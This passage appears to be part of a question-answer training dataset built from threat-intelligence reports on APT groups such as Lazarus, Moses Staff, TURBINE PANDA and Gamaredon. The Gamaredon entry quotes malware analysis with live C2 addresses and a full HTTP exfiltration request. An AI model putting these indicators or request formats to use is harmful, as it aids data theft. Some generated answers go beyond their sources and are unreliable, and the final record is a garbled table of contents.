    "instruction": "Write an answer to the following question: How does the Lazarus Group leverage internationalized domain names (IDNs) in their phishing campaigns, and what techniques do they employ to make these campaigns effective?",
    "output": "The Lazarus Group uses internationalized domain names (IDNs) to create fake websites that closely resemble legitimate cryptocurrency sites. For example, they used an IDN for a Bitcoin Gold (BTG) wallet application, where the malicious link 'hxxps://xn--bitcoingld-lcb[.]org/' appears as 'hxxps://bitcoing\u00f6ld[.]org/' in web browsers and email clients. This technique makes it difficult for users to recognize the malicious intent due to the similarity to legitimate domains. The group sends phishing emails with these links, enticing users to visit the fake sites and download backdoored PyInstaller executables that deliver the PowerRatankba implant.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Connecting the Dots: Syrian Malware Team Uses BlackWorm for Attacks\nThe Syrian Electronic Army has made news for its (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/07/syrian-electronic-army-hacks-major-communications-websites.html>)recent attacks on major communications websites, (<http://www.forbes.com/sites/andygreenberg/2014/02/20/how-the-syrian-electronic-army-hacked-us-a-detailed-timeline/>)Forbes, and an alleged attack on (<http://blogs.computerworld.com/cybercrime-and-hacking/23668/syrian-electronic-army-attacks-centcom-us-central-command-denies-it-was-hacked>)CENTCOM. While these attacks garnered public attention, the activities of another group \u2013 The Syrian Malware Team \u2013 have gone largely unnoticed. The group's activities prompted us to take a closer look. We discovered this group using a .NET based RAT called BlackWorm to infiltrate their targets.\nThe Syrian Malware Team is largely pro-Syrian government, as seen in one of their banners featuring Syrian President Bashar al-Assad. Based on the sentiments publicly expressed by this group it is likely that they are either directly or indirectly involved with the Syrian government. Further certain members of the (<http://en.wikipedia.org/wiki/Syrian_Electronic_Army>)Syrian Malware Team  known to be linked to the Syrian the SEA.\nBanner used by the Syrian Malware Team\nAnswer this question: How does the use of the BlackWorm RAT by the Syrian Malware Team reflect their strategic objectives and potential affiliations?",
    "output": "The Syrian Malware Team's use of the BlackWorm RAT, a .NET based Remote Access Trojan, indicates a sophisticated approach to infiltrating their targets. This choice of malware suggests that the group aims to gain persistent access to their victims' systems, potentially for espionage or further disruptive activities. The group's pro-Syrian government stance, as evidenced by their banners featuring Syrian President Bashar al-Assad, aligns with their likely objective of supporting the Syrian regime. Additionally, the connection between certain members of the Syrian Malware Team and the Syrian Electronic Army (SEA) suggests that they may be directly or indirectly involved with the Syrian government. This affiliation underscores the potential for state-sponsored or state-aligned activities, highlighting the need for cybersecurity experts to be vigilant against such advanced and politically motivated threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Research\nAffected Platforms: Windows\nImpacted Users: Windows Users\nImpact: Data theft and execution of additional malicious payloads\nSeverity Level: Critical\nOver the past year, FortiEDR has prevented multiple attacks that attempted to exploit various Microsoft Exchange server vulnerabilities, some of which we have previously .\nAmong these attacks, we identified a campaign operated by Moses Staff, a geo-political motivated threat group believed to be sponsored by the Iranian government. After tracking this campaign for the last several months we found that the group has been using a custom multi-component toolset for the purpose of conducting espionage against its victims.\nThis campaign exclusively targets Israeli organizations. Close examination reveals that the group has been active for over a year, much earlier than the group's first official public exposure, managing to stay under the radar with an extremely low detection rate.\nIn this blog, we will cover the Techniques, Tactics, and Procedures (TTPs) used by Moses Staff and reveal a new backdoor used by them to download files, execute payloads, and exfiltrate data from target networks, along with threat intelligence data on their activities.\nAnswer this question: Why did the Moses Staff campaign manage to stay under the radar with an extremely low detection rate? Explain the factors that contributed to this evasion.",
    "output": "The Moses Staff campaign managed to stay under the radar with an extremely low detection rate due to several factors. Firstly, the group used a custom multi-component toolset specifically designed for espionage purposes, making it harder for traditional security measures to detect their activities. Secondly, the campaign exclusively targeted Israeli organizations, which allowed them to focus their efforts and tailor their tactics to a specific set of targets. Additionally, the group had been active for over a year before their first official public exposure, indicating that they were able to operate covertly for an extended period. This combination of custom tools, targeted approach, and prolonged undetected activity contributed to their ability to evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nIn October 2012, Kaspersky Lab's Global Research & Analysis Team initiated a new threat research after a series of attacks against computer networks of various international diplomatic service agencies. A large scale cyber-espionage network was revealed and analyzed during the investigation, which we called \"Red October\" (after famous novel \"The Hunt For The Red October\").\nThis report is based on detailed technical analysis of a series of targeted attacks against diplomatic, governmental and scientific research organizations in different countries, mostly related to the region of Eastern Europe, former USSR members and countries in Central Asia.\nThe main objective of the attackers was to gather intelligence from the compromised organizations, which included computer systems, personal mobile devices and network equipment.\nThe earliest evidence indicates that the cyber-espionage campaign was active since 2007 and is still active at the time of writing (January 2013). Besides that, registration data used for the purchase of several Command & Control (C&C) servers and unique malware filenames related to the current attackers hints at even earlier time of activity dating back to May 2007.\nRead the text above and answer this question: What were the primary objectives of the 'Red October' cyber-espionage campaign, and how did the attackers achieve these goals?",
    "output": "The primary objective of the 'Red October' cyber-espionage campaign was to gather intelligence from the compromised organizations. This included targeting computer systems, personal mobile devices, and network equipment. The attackers achieved these goals by employing a series of targeted attacks against diplomatic, governmental, and scientific research organizations, primarily in Eastern Europe, former USSR members, and countries in Central Asia. The campaign was active since at least 2007 and continued until January 2013, with some indications suggesting it might have started even earlier, in May 2007. The attackers used sophisticated methods, including the use of Command & Control (C&C) servers and unique malware filenames, to carry out their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Two teams of Iran-based attackers have been using back door threats to conduct targeted surveillance of domestic and international targets. While the groups are heavily targeting individuals located in Iran, they've also compromised airlines and telecom providers in the Middle East region, possibly in an attempt to monitor targets' movements and communications.\nThe attackers are part of two separate groups that have a shared interest in targets. One group, which we call Cadelle, uses (<https://www.symantec.com/security_response/writeup.jsp?docid=2015-090808-1754-99>)Backdoor.Cadelspy, while the other, which we've named Chafer, uses and . These threats are capable of opening a back door and stealing information from victims' computers\n\nWhy did the Iran-based attacker groups, Cadelle and Chafer, target both domestic and international entities, including airlines and telecom providers in the Middle East? How does this strategy enhance their surveillance capabilities?",
    "output": "A: The Iran-based attacker groups, Cadelle and Chafer, targeted both domestic and international entities, including airlines and telecom providers in the Middle East, to conduct targeted surveillance. By compromising these organizations, the attackers could potentially monitor the movements and communications of their targets. This strategy enhances their surveillance capabilities by providing access to critical infrastructure that tracks travel patterns and communication data, allowing them to gather comprehensive intelligence on their targets' activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: The corporate espionage threat\nPrior to Butterfly, the majority of documented cyberespionage attacks has been conducted against politically sensitive entities such as embassies, government ministries, central banks, dissidents, militaries, and associated defense contractors. Government-sponsored attackers have also attacked private sector organizations, presumably to steal intellectual property in order to provide their local industry with an unfair advantage in the market.\nButterfly is a timely reminder to organizations that as well as defending against state-sponsored attacks, organizations must be aware of the potential threat of corporate espionage, where attacks are performed at the behest of competitors or by individuals looking to monetize stolen information such as through stock trading using insider knowledge. A key difference between attacks coming from competitors and state-sponsored attackers is that competitors are likely in a better position to request the theft of specific information of value and make more rapid use of this information than government-sponsored attackers would.\nButterfly appears to be part of this class of attack group. The attackers appear to be motivated by financial gain, either by using the information themselves for their own benefit or selling it to a third party.\nRead the text above and answer this question: How does the motivation and approach of the Butterfly APT differ from traditional state-sponsored cyberespionage attacks? Why is this distinction important for organizations to understand when developing their cybersecurity strategies?",
    "output": "The motivation and approach of the Butterfly APT differ from traditional state-sponsored cyberespionage attacks primarily in their goals and the speed at which they can utilize stolen information. Traditional state-sponsored attacks often target politically sensitive entities like embassies, government ministries, central banks, and defense contractors, aiming to steal intellectual property to give their local industries an unfair advantage. In contrast, Butterfly is driven by financial gain, either by using the stolen information for their own benefit or selling it to a third party. This distinction is crucial for organizations because competitors are likely in a better position to request the theft of specific valuable information and make more rapid use of this information than government-sponsored attackers. Understanding this difference helps organizations tailor their cybersecurity strategies to defend against both state-sponsored attacks and corporate espionage, ensuring they are prepared for the unique threats posed by financially motivated attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: PART I: THE TARGET\nThe story starts with a simple fact: Beijing accurately predicted that due to its rising economic status, China's middle class demand for air travel would far outpace its ability to supply aircraft and a domestic commercial aviation industry capable of supporting these logistics. Putting aside the obvious military-civil (\u519b\u6c11\u878d\u5408) benefits1 that turbine engines have for the energy and aviation sectors, much of China's strategic push into this industry is predicated by necessity. China is predicted2 to succeed the U.S. as the world's largest aviation market by 2022, adding nearly 1 billion passengers by 2036. From China's 12th and 13th Five Year Plan to the increasingly scrutinized Made in China 2025 Plan,3 numerous state strategic plans have named aerospace and aviation equipment as one of ten priority industries to focus on \"leap-frog\" developments.\nSource: CSIS China Power Project\nA major focus of this strategy centered on building an indigenous Chinese-built commercial aircraft designed to compete with the duopoly of western aerospace. That aircraft would become the C919\u2014an aircraft roughly half the cost of its competitors, and which completed its first maiden flight4 in 2017 after years of delays due to design flaws. But the C919 can hardly be seen as a complete domestic triumph as\nit is reliant on a plethora of foreign-manufactured components (see Figure 3). 5 Likely in an effort to bridge those gaps, a Chinese state-aligned adversary CrowdStrike calls TURBINE PANDA conducted cyber intrusions from a period of roughly 2010 to 2015 against several of the companies that make the C919's various components.\n1 https://www.rand.org/content/dam/rand/pubs/research_reports/RR200/RR245/RAND_RR245.pdf\n2 https://www.weforum.org/agenda/2018/08/these-five-charts-show-how-rapidly-china-s-aviation-industry-is-expanding/\n3 https://www.uschamber.com/sites/default/files/final_made_in_china_2025_report_full.pdf\n4 https://www.theguardian.com/world/2017/may/05/chinas-first-home-made-plane-makes-maiden-flight\nSource: https://www.aerotime.aero/aerotime.team/447-made-in-china-why-c919-can-hardly-be-called-chinese\nSpecifically, in December 2009, the state-owned enterprise (SOE) Commercial Aircraft Corporation of China (COMAC/\u4e2d\u56fd\u5546\u7528\u98de\u673a\u6709\u9650\u8d23\u4efb\u516c\u53f8) announced it had chosen CFM International's (a joint venture between U.S.-based GE Aviation and French aerospace firm Safran, formerly Snecma) LEAP-X engine to provide a custom variant engine, the LEAP-1C, for the then-newly announced C919. The deal was reportedly signed in Beijing during a visit by then-French Prime Minister Fran\u00e7ois Fillon.6 Despite the early deal with CFM, both COMAC and fellow SOE the Aviation Industry Corporation of China (AVIC/\u4e2d\u56fd\u822a\u7a7a\u5de5\u4e1a\u96c6\u56e2\u516c\u53f8) were believed7 to be tasked by China's State-owned Assets Supervision and Administration Commission of the State Council (SASAC) with building an \"indigenously created\" turbofan engine that was comparable to the LEAP-X.8\nIn August 2016, both COMAC and AVIC became the main shareholders of the Aero Engine Corporation of China (AECC/\u4e2d\u56fd\u822a\u7a7a\u53d1\u52a8\u673a\u96c6\u56e2), which produced the CJ-1000AX engine. The CJ-1000AX bears\n5 https://www.aerotime.aero/aerotime.team/447-made-in-china-why-c919-can-hardly-be-called-chinese\n6 https://www.flightglobal.com/news/articles/cfm-international-to-provide-engines-for-comacs-c919-336414/\n7 http://www.xinhuanet.com/english/2017-05/04/c_136257538.htm\n8 http://www.miit.gov.cn/n1146290/n1146397/c4244228/content.html\nmultiple similarities to the LEAP-1C,9 including its dimensions10 and turbofan blades. The AECC conducted its first test as recently as May 2018, having overcome significant difficulties in their first mockups. Though it is difficult to assess that the CJ-1000AX is a direct copy of the LEAP-X without direct access to technical engineering specifications, it is highly likely that its makers benefited significantly from the cyber espionage efforts of the MSS, detailed further in subsequent blog installments, knocking several years (and potentially billions of dollars) off of its development time.\nThe actual process by which the CCP and its SOEs provide China's intelligence services with key technology gaps for collection is relatively opaque, but what is known from CrowdStrike Intelligence reporting and corroborating U.S. government reporting11 is that Beijing uses a multi-faceted system of forced technology transfer, joint ventures, physical theft of intellectual property from insiders, and cyber-enabled espionage to acquire the information it needs. Specifically, SOEs are believed to help identify major intelligence gaps in key projects of significance that China's intelligence services then are likely tasked with collecting. It is assessed with high confidence that the MSS was ultimately tasked with targeting firms that had technologies pertaining to the LEAP-X engine and other components of the C919, based on timing and the details revealed in the DoJ indictments. For example, the first preparatory activity in January 2010 believed to be associated with TURBINE PANDA targeted Los Angeles-based Capstone Turbine and began just a month after choosing CFM as its engine provider.\nThis brings us to our culprits: the Jiangsu Bureau of the MSS (JSSD/\u6c5f\u82cf\u7701\u56fd\u5bb6\u5b89\u5168\u5385) located in Nanjing. In Part II, we will discuss the JSSD's location, and its joint operations between the JSSD's cyber operators and its human intelligence officers.\nQuestion: How did China's strategic push into the aerospace industry lead to the development of the C919 aircraft, and what role did cyber intrusions play in this process?",
    "output": "Answer: China's strategic push into the aerospace industry was driven by the need to meet the growing demand for air travel and to reduce dependence on foreign-manufactured components. This led to the development of the C919 aircraft, which aimed to compete with Western aerospace firms. However, the C919 relied heavily on foreign components. To bridge these technological gaps, a Chinese state-aligned adversary known as TURBINE PANDA conducted cyber intrusions from around 2010 to 2015 against companies that manufactured components for the C919. These intrusions likely aimed to acquire intellectual property and technical specifications to aid in the development of indigenous Chinese components.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: About Symantec\nSymantec Corporation (NASDAQ: SYMC) is an information protection expert that helps people, businesses and governments seeking the freedom to unlock the opportunities technology brings -- anytime, anywhere. Founded in April 1982, Symantec, a Fortune 500 company, operating one of the largest global data-intelligence networks, has provided leading security, backup and availability solutions for where vital information is stored, accessed and shared. The company's more than 19,000 employees reside in more than 50 countries. Ninety-nine percent of Fortune 500 companies are Symantec customers. In fiscal 2015, it recorded revenues of $6.5 billion.\nTo learn more go to  or connect with\n/\nSymantec at: .\nQuestion: How does Symantec's extensive global presence and customer base contribute to its effectiveness in combating cyber threats, particularly those posed by advanced persistent threat groups like Black Vine?",
    "output": "Answer: Symantec's effectiveness in combating cyber threats, including those from advanced persistent threat groups like Black Vine, is significantly bolstered by its extensive global presence and customer base. As a Fortune 500 company with over 19,000 employees operating in more than 50 countries, Symantec maintains one of the largest global data-intelligence networks. This network allows Symantec to gather and analyze vast amounts of data from diverse sources, providing a comprehensive view of the threat landscape. Additionally, with 99% of Fortune 500 companies as customers, Symantec has access to a wide range of high-value targets, enabling it to identify and respond to sophisticated attacks quickly. This broad reach and deep insight into various industries enhance Symantec's ability to develop and deploy leading security solutions that protect vital information wherever it is stored, accessed, or shared.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: |  DISRUPTIVE IT MALWARE\nIT malware infecting and causing issues in operational networks is not a new phenomenon. Tracking the metrics related to these infections has always been difficult due to collection issues from these environments. This led to very low metrics, such as the ICS- CERT's consistent ~200 incidents each year, to very high metrics including some vendors claiming upwards of 500,000 infections a year. For this reason, Dragos created the Malware in Modern ICS (MIMICS) project in late 2016 and running through early 2017.3 The research performed a census-styled metrics count of infections in ICS networks and identified around 3,000 unique industrial infections during the research period. This led to the estimate of around 6,000 unique infections in industrial environments every year including various types of viruses, trojans, and worms. While any of these infections could cause issues in operational environments none represented the type of disruption that would come from the latest generation of ransomware worms.\nWannaCry appeared in May 2017 following the weaponization of the MS17-010 vulnerability in the Microsoft Server Message Block (SMB) protocol (EterenalBlue), released as part of the 'Shadow Brokers' continual leak of alleged National Security Agency hacking tools. WannaCry itself was a form of ransomware designed to self-propagate via the MS17-0104 vulnerability, resulting in not only a quick spread globally but also the systematic infection of networks due to the malware's 'wormable' nature.\n3 (<https://dragos.com/blog/mimics/>)https://dragos.com/blog/mimics/\n4 (<https://docs.microsoft.com/en-us/security->)https://docs.microsoft.com/en-us/security- updates/securitybulletins/2017/ms17-010\nWhile ransomware is typically  not  a  concern for ICS defenders, WannaCry challenged the traditional view due to its self-propagating method exploiting a common ICS communication mechanism (SMB)\nVarious data transfer functions, such as moving data from the ICS network (e.g., historians) to the business network for business intelligence purposes, rely upon SMB for functionality. Combined with poor patch management and enabling older, vulnerable forms of SMB instead of the newer SMB version 3 variant, hosts within the ICS network were not only reachable through pre-existing connections to the IT network but vulnerable as well.\nThe result of the above circumstances was WannaCry spreading into and impacting ICS environments, including automotive manufacturers and shipping companies. The impact to operations from system loss due to encryption certainly varies, but in ICS environments the damage potential is significant regarding lost production and capability.\nFurthermore, WannaCry was not the only ransomware type to implement worm-like functionality, with additional malware NotPetya and BadRabbit emerging over the course of 2017. Of these, NotPetya was especially concerning for several reasons: first, it included multiple means of propagation through credential capture and reuse aside from relying solely on the MS17- 010 vulnerability; second, the malware was effectively a 'wiper' as encrypted filesystems could not be recovered. Although initially targeting Ukrainian enterprises, NotPetya soon spread to many organizations resulting in significant system impacts and, in several documented cases, production losses in ICS environments.\nAlthough not targeted at ICS environments, the impact of WannaCry and related malware demonstrates the capability for IT-focused malware to migrate into ICS environments. While patching may not be a viable solution for ICS defenders in cases such as MS17-010, strengthening and hardening defenses at porous boundaries could help.\nBig Headline: ACTIVITY GROUPS\nDragos tracks and organizes related threat activity as 'activity groups': essentially, combinations of behavior or techniques, infrastructure, and victimology.5 This process avoids the potentially messy and hard-to- prove traditional attribution route \u2013 aligning activity to specific actors or nation-states \u2013 while also providing concrete benefits to defenders by organizing observed attackers into collections of identified actions.\nWithin the scope of ICS network defense, Dragos currently tracks five activity groups that have either demonstrated the capability to attack ICS networks directly or have displayed an interest in reconnaissance and gaining initial access into ICS-specific entities.\n5 The concept of activity groups comes from The Diamond Model of Intrusion Analysis: (<http://www.diamondmodel.org/>)http://www.diamondmodel.org/\nBig Headline: ELECTRUM\nELECTRUM is responsible for the 2016 Ukrainian power outage event, created through CRASHOVERRIDE. In addition to this signature, high-profile event, Dragos has linked ELECTRUM with another group, the SANDWORM Advanced Persistent Threat (APT) (iSight), responsible for the 2015 Ukrainian outage. ELECTRUM previously served as the 'development group' facilitating some SANDWORM activity \u2013 including possibly the 2015 Ukrainian power outage \u2013 but moved into a development  and  operational  role  in the CRASHOVERRIDE event.\nWhile ELECTRUM does not have any other high-profile events to its name as of this writing, Dragos has continued to track on- going, low-level activity associated with the group. Most notably, 2017 did not witness another Ukrainian power grid event, unlike the previous two years. Based on available information, ELECTRUM remains active, but evidence indicates the group may have 'moved on' from its previous focus exclusively on Ukraine.\nWhile past ELECTRUM activity has focused exclusively on Ukraine, ongoing activity and the group's link to SANDWORM provide sufficient evidence for Dragos to assess that ELECTRUM could be 're-tasked' to other areas depending on the focus of their sponsor.\nGiven ELECTRUM's past activity and ability to successfully operate within the ICS environment, Dragos considers them  to be one of the most significant and capable threat actors within the ICS space\nBig Headline: COVELLITE\nCOVELLITE First emerged in September 2017, when Dragos identified a small, but highly targeted, phishing campaign against a US electric grid company  The phishing document and  subsequent  malware   \u2013  embedded within a malicious Microsoft Word document \u2013 both featured numerous techniques  to  evade analysis and detection Although the attack identified is particular to the  one targeted entity, Dragos soon uncovered attacks with varying degrees of similarity spanning Europe, North America, and East Asia\nCommon  to all of these observed COVELLITE-related instances was the use of similar malware functionality, including the use of HTTPS for command and control (C2), and the use of compromised infrastructure as C2 nodes\nAs Dragos continued tracking this group, we identified similarities in both infrastructure and malware with the LAZARUS GROUP APT6 (Novetta), also referred to as ZINC (Microsoft), and HIDDEN COBRA (DHS). This activity group has variously been associated with destructive attacks against Sony Pictures7 and to bitcoin theft incidents in 2017.8 While Dragos does not comment on or perform traditional nation-state attribution, the combination of technical ability plus the willingness to launch destructive attacks displayed by the linked group LAZARUS make COVELLITE an actor of significant interest.\nDragos has yet to identify another grid- specific targeting event since September 2017 although similar malware and related activity continue. Finally, noted capabilities thus far would only suffice for initial network access and reconnaissance of a target network \u2013 COVELLITE has not used or shown evidence of an ICS-specific capability.\n6 (<https://www.novetta.com/tag/the-lazarus-group/>)https://www.novetta.com/tag/the-lazarus-group/\n7 (<http://www.novetta.com/2016/02/operation-blockbuster-unraveling-the-long-thread-of-the-sony-attack/>)http://www.novetta.com/2016/02/operation-blockbuster-unraveling-the-long-thread-of-the-sony-attack/\n8 (<https://www.recordedfuture.com/north->)https://www.recordedfuture.com/north- korea-cryptocurrency-campaign/\nQuestion: How did NotPetya differ from WannaCry in terms of propagation and impact, and what made it especially concerning for ICS environments?",
    "output": "Answer: NotPetya differed from WannaCry in several ways. First, it included multiple means of propagation through credential capture and reuse, aside from relying solely on the MS17-010 vulnerability. Second, NotPetya was effectively a 'wiper' as encrypted filesystems could not be recovered. Initially targeting Ukrainian enterprises, NotPetya soon spread to many organizations, resulting in significant system impacts and, in several documented cases, production losses in ICS environments. These factors made NotPetya especially concerning for ICS environments.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Final Word\nThe implants identified have limited, generic, and often conflicting detections on VirusTotal. The threat group using these implants has been active since at least 2014 and has been seen targeting individuals likely involved in the Ukrainian government. Some of the samples share delivery mechanisms and infrastructure with samples which are detected by a few antivirus vendors as Gamaredon. However, newer variants deliver more advanced malware which goes unnamed.\nPeriodically, researchers at Palo Alto Networks hunt through WildFire execution reports, using AutoFocus, to identify untagged samples' artifacts in the hopes of identifying previously undiscovered malware families, behaviors, and campaigns.\nThis blog presents a threat group identified by the above process using AutoFocus. By actively hunting for malicious activity and files instead of waiting for alerts to triage, defenders can identify and building protections for new trends before they arrive on their corporate networks and endpoints. More details about this threat group can be found in the AutoFocus tag (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.GamaredonGroup>)GamaredonGroup.\nPalo Alto Networks customers are protected from this threat in the following ways:\nWildFire identifies the malware described in this report as malicious.\nTraps prevents execution of the malware described in this report.\nThe C2 domains used by this group are blocked through Threat Prevention.\nSpecial thanks go out to Tom Lancaster for both his assistance in this investigation and for his charming good looks.\nMedium Headline: USBStealer: MSO5678.usb / OfficeUpdate.dll\nThis file is a USB file stealer which can be also guessed by its internal name \"USBgrabber.dll\". However, the implementation is sloppy which makes it a file stealer for any newly connected logical volume on a system. This is because the malware monitors the computer for messages WM_COMMAND and WM_DEVICECHANGE, but not verifying if a USB drive was connected.\nThe malware creates two mutexes \"__Wsnusb73__\" and \"__Wsnusbtt73__\". Then, it creates the following folder in the temp path of the local user:\n\"C:\\Users\\<Username>\\AppData\\Local\\Temp\\reports\"\nThis folder is used as a temporary location to copy all files from a newly connected logical drive to and upload them to the C2 server. The files are transferred to the hardcoded C2 server \"195.62.52.93\" one by one via HTTP POST method. The following request is used which also includes information about the victim, the file to be transferred as well as the source drive:\nThe malware also creates a SQLite database named \"asha.dat\" in the local users temp folder. Therein, it keeps track of files which were stolen by calculating the MD5 hash of the filename followed by the file length. Therefore, it creates a Unicode string of the original file path from the drive and concatenates the file size in bytes to it. Finally, it uses the API functions MD5Init(), MD5Update() and MD5Final() to calculate the hash and store it in the database.\nIt should be noted, that only hashes of files are added to the database that don't have the following extensions:\nDLL\nBIN\nCAB\nEXE\nISO\nMedium Headline: Downloader: MSO1567.dls / LocalSMS.dll\nThis file is essentially a simple downloader which contacts the C2 server to send some user data and get an executable as response which will be executed. The DLL is written in C++ and contains all of the functionality is in an export function named \"EntryPoint\". The file was compiled without any compiler or linker optimizations, thus the big file size and the remaining PDB path string.\nAt first, the malware retrieves the temp path of the local user (\"C:\\Users\\<Username>\\AppData\\Local\\Temp\\\"), the computer name (e.g. \"WIN-MLABCSUOVJB\"), the hardware profile GUID (e.g. \"{826ee360-7139-11de-8d20-808e6f6e6263}\") and the volume serial number of C:\\ drive (e.g. \"1956047236\"). Next, it takes the following hardcoded string:\nhttp://adobe.update-service[.]net/index.php?comp=\nTo create a URL string with the victims information for contacting the C2 server:\nhttp://adobe.update-service[.]net/index.php?comp=WIN-MLABCSUOVJB&id=WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236\nTo create the filename where the downloaded file will be saved, the malware tries to build a random string of 10 characters. However, due to an implementation error the string always ends up being the same, namely \"frAQBc8Wsa\". This string gets concatenated with the retrieved local users temp path to the following file path:\nC:\\Users\\\\AppData\\Local\\Temp\\frAQBc8Wsa\nThen, it uses the API function URLDownloadToFileA() to download a payload to disk and executes it via CreateProcess(). Finally, it sleeps for 60 seconds before terminating the payload and the DLL exits.\nMedium Headline: Downloader: MSO8734.obn / MpClients.dll\nThis file is a slightly more advanced version of LocalSMS.dll downloader. Instead of downloading a payload directly to disk, this file requests a download command from the C2 server which contains the actual payload URL to be used. Therefore, it uses a basic network implementation based on the Winsock functions. All the functionality of this DLL is put into an export function named \"bitDefender\".\nIt creates a socket, requests the address of the hardcoded C2 server \"win-restore.ru\" via gethostbyname() and connects to it. Thereafter, it also collects the volume serial number of C:\\ drive, the computer name and the hardware profile GUID. With this information, it creates the following string used by a subsequent send() function call:\n\"GET /css.php?id=WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236 HTTP/1.1\nHost: win-restore.ru\nConnection: close\"\nThe response will be stored into a memory buffer via recv() and scanned for the string \"urltoload={\". As the name suggests, the received data contains the actual URL of the payload inside curly brackets. The URL gets pulled out of the string and is used again as input for the API function URLDownloadToFile(). Again, the same file path will be used to store the payload on disk and execute it:\n\"C:\\Users\\<Username>\\AppData\\Local\\Temp\\frAQBc8Wsa\"\nMedium Headline: Pteranodon: MSO1234.win / winrestore.dll\nPteranodon is a backdoor which also can capture screenshots based on a configuration file created on the disk. Further, it uploads the screenshots to the C2 server unencrypted. All the functionality of this DLL is put into an export function named \"updater\".\nAt first, it retrieves the %APPDATA% folder of the local user to build the following file path:\n\"C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\desktop.ini\"\nThen, it checks if the file already exists and continues execution if so. If not, it runs a routine which checks if there is mouse movement as an anti-sandbox technique. If no mouse movement is detected the malware runs in an infinite loop checking for mouse movement.\nIf the file \"desktop.ini\" does not exist, the malware creates it and writes the following information into it:\n\" interval={60} msfolder={10} status={0}\"\nThis information is used as configuration data to create the screenshots. There are also other commands possible which can be retrieved from the C2 server. The following commands are available:\nSmall Headline: status={\nThis command contains the flag which defines if screenshots should be made (\"1\") or not (\"0\").\nNext, it checks for a mutex named \"asassin1dj\" to verify if the system is already infected and creates it if this isn't the case:\nNext, it creates the following folder, if not already present:\n\"C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store\"\nNext, according to the configuration data in \"desktop.ini\" it constantly creates 24-bit color depth JPEG screenshots without extension in the store folder with help of GDI32 and gdiplus API functions. The following file naming scheme for the screenshots is used:\n<year><month><day>_<hour><minute><seconds>\nAfter the last screenshot was created, it uploads all files from the \"store\" folder to the C2 server \"win-restore[.]ru\". Then, it deletes all the files present in the folder and starts a new screenshot creation cycle. It should be noted that there is no check of what files are uploaded. The files are uploaded via POST HTTP method to the script \"vvd.php\". For this, the following HTTP request is used which contains also data from the victim as well the JPEG files:\n1 POST /vvd.php HTTP/1.1\n2 Accept: application/x-www-form-urlencoded\n3 Connection: Keep-Alive\n4 Content-Type: multipart/form-data; boundary=----------987978B0urd3Gf_$\n5 Accept-Charset: utf-8\n6 User-Agent: asasing\n7 Host: win-restore.ru\n8 Content-Length: <length>\n9 Cache-Control: no-cache\n10 11 ------------987978B0urd3Gf_$\n12 Content-Type: text/html\n13 Content-Disposition: form-data; name=\"uuid\" 14\n15 WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236\n16 ------------987978B0urd3Gf_$\n17 Content-Type: application/octet-stream\n18 Content-Disposition: form-data; name=\"file0\"; filename=\"_\"\n19 Content-Transfer-Encoding: 8bit 20 ...JPEG file...\n21 ------------987978B0urd3Gf_$\n22 Content-Type: application/octet-stream\n23 Content-Disposition: form-data; name=\"file1\"; filename=\"_\"\n24 Content-Transfer-Encoding: 8bit\n25 ...JPEG file... 26 ...\n27 ------------987978B0urd3Gf_$\nFinally, it checks if any new command information is available from the C2 server and updates the \"desktop.ini\" file according to it. Based on functionality, compile timestamps, and binary differencing this malware is likely an updated version of 598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824.\n\nQ: What are the differences between the 'LocalSMS.dll' and 'MpClients.dll' downloader malwares used by the Gamaredon Group?",
    "output": "A: 'MpClients.dll' is a more advanced version of 'LocalSMS.dll'. Instead of downloading a payload directly to disk, 'MpClients.dll' requests a download command from the C2 server which contains the actual payload URL. It uses Winsock functions to create a socket and communicate with the C2 server. The malware collects the volume serial number, computer name, and hardware profile GUID to create a request string. The response from the C2 server includes the payload URL, which is then downloaded and executed similarly to 'LocalSMS.dll'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Figure\t\n  49\t\n  IP.Alias Resolution for drometic.suroot.com ...........................................................................................................................27\nFigure\t\n \u00a050\t\n \u00a0FF-\u00ad\u2010RAT Encoded\t\n \u00a0Beacon ..........................................................................................................................................................28\nFigure\t\n \u00a051\t\n \u00a0FF-\u00ad\u2010RAT Decoded Beacon..........................................................................................................................................................28\nFigure\t\n \u00a052\t\n \u00a0FF-\u00ad\u2010RAT Detection\t\n \u00a0Parser ..........................................................................................................................................................28\nFigure\t\n \u00a053: Trojan.Lurker -\u00ad\u2010 DES keys used by each variant .......................................................................................................................29\nFigure\t\n \u00a054: Trojan.SuperhardCorp -\u00ad\u2010 binary snippet ..................................................................................................................................30\nFigure\t\n \u00a055: Trojan.DerusbiAP32\t\n \u00a0-\u00ad\u2010 configuration file .................................................................................................................................31\nFigure\t\n  56: Trojan.Hikit deobfuscated configuration file ..........................................................................................................................32\nFigure\t\n  57: Trojan.Gh0st magic string.......................................................................................................................................................35\nFigure\t\n \u00a058: Trojan.PoisonIvy -\u00ad\u2010 Memory snippet containing password .....................................................................................................35\nFigure\t\n  59: PosionIvy server side ..............................................................................................................................................................36\nFigure\t\n  60: Plaintext file ............................................................................................................................................................................38\nFigure\t\n  61: aPACK\t\n  file\t\n  structure ................................................................................................................................................................38\nFigure\t\n \u00a062: Trojan.FF-\u00ad\u2010RAT configuration\t\n \u00a0file structure 